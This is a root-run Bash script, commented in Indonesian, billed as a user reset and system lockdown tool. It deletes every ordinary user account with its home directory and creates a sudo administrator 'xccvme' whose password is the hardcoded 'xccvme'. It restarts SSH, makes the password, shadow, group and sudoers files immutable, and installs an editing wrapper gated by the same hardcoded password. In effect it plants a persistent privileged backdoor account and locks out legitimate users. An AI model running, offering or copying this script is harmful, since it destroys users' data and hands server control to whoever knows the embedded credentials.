#!/bin/bash

# Pastikan dijalankan sebagai root
if [ "$(id -u)" -ne 0 ]; then
    echo "❌ Script harus dijalankan sebagai root!"
    exit 1
fi

echo "========================================================"
echo "   RESET USER & LOCKDOWN SYSTEM (IMMUTABLE)"
echo "========================================================"

# DAFTAR FILE SISTEM VITAL
SYS_FILES=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow" "/etc/sudoers")
LOCK_TOOL="/usr/bin/edit-user-config"

# 1. BUKA KUNCI LAMA (JIKA ADA)
echo "[+] Membuka kunci sistem sementara..."
for FILE in "${SYS_FILES[@]}"; do
    if lsattr "$FILE" 2>/dev/null | grep -q "i"; then
        chattr -i "$FILE"
    fi
done

# 2. HAPUS SEMUA USER NORMAL (UID >= 1000) KECUALI ROOT
echo "[+] Membersihkan user lama..."
USER_LIST=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)

for USER in $USER_LIST; do
    if [ "$USER" == "root" ]; then continue; fi
    userdel -r "$USER" >/dev/null 2>&1
    pkill -u "$USER" >/dev/null 2>&1
done

# 3. BUAT USER BARU 'xccvme'
USERNAME="xccvme"
PASSWORD="xccvme"

echo "[+] Membuat user admin: $USERNAME"
if ! id "$USERNAME" &>/dev/null; then
    useradd -m -s /bin/bash -G sudo "$USERNAME"
fi

# Set password & Group
echo "$USERNAME:$PASSWORD" | chpasswd
if grep -q "^sudo:" /etc/group; then
    usermod -aG sudo "$USERNAME"
elif grep -q "^wheel:" /etc/group; then
    usermod -aG wheel "$USERNAME"
fi

echo "    ✅ User $USERNAME berhasil dibuat."

# 4. RESTART SERVICE SSH
if command -v systemctl >/dev/null 2>&1; then
    systemctl restart ssh
    systemctl restart sshd
else
    service ssh restart
fi

# 5. KUNCI MATI SISTEM (IMMUTABLE)
echo "[+] MENGUNCI FILE SISTEM (Immutable Mode)..."
for FILE in "${SYS_FILES[@]}"; do
    chattr +i "$FILE"
    if lsattr "$FILE" | grep -q "i"; then
        echo "    🔒 Terkunci: $FILE"
    else
        echo "    ⚠️ Gagal mengunci: $FILE"
    fi
done

# 6. BUAT ALAT EDIT KHUSUS (WRAPPER)
echo "[+] Membuat alat manajemen user: edit-user-config"
cat > "$LOCK_TOOL" <<EOF
#!/bin/bash
SYS_FILES=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow" "/etc/sudoers")

echo "==================================================="
echo "   SECURE USER MANAGER"
echo "   Sistem User terkunci (Immutable)."
echo "==================================================="
echo "Menu Edit:"
echo "1. Edit /etc/passwd (List User)"
echo "2. Edit /etc/shadow (Password Hash)"
echo "3. Edit /etc/sudoers (Izin Sudo)"
echo "4. Keluar"
read -p "Pilihan: " PILIH

case \$PILIH in
    1) TARGET="/etc/passwd" ;;
    2) TARGET="/etc/shadow" ;;
    3) TARGET="/etc/sudoers" ;;
    *) exit 0 ;;
esac

echo ""
read -s -p "Masukkan Password Admin (xccvme): " MYPASS
echo ""

if [ "\$MYPASS" == "xccvme" ]; then
    echo "🔓 Password Benar. Membuka kunci..."
    for F in "\${SYS_FILES[@]}"; do chattr -i "\$F"; done
    
    echo "📝 Membuka NANO..."
    nano \$TARGET
    
    echo "🔒 Mengunci kembali semua file..."
    for F in "\${SYS_FILES[@]}"; do chattr +i "\$F"; done
    echo "✅ Selesai."
else
    echo "❌ PASSWORD SALAH! Akses ditolak."
    exit 1
fi
EOF

chmod +x "$LOCK_TOOL"

echo "========================================================"
echo "   LOCKDOWN SELESAI"
echo "========================================================"
echo "⚠️  CATATAN PENTING:"
echo "1. Sistem User (passwd/shadow) sekarang TERKUNCI (+i)."
echo "2. Perintah 'useradd' atau 'passwd' biasa AKAN GAGAL."
echo "3. Untuk mengedit user/password, GUNAKAN PERINTAH:"
echo "   👉 edit-user-config"
echo "   (Password akses: xccvme)"
echo "========================================================"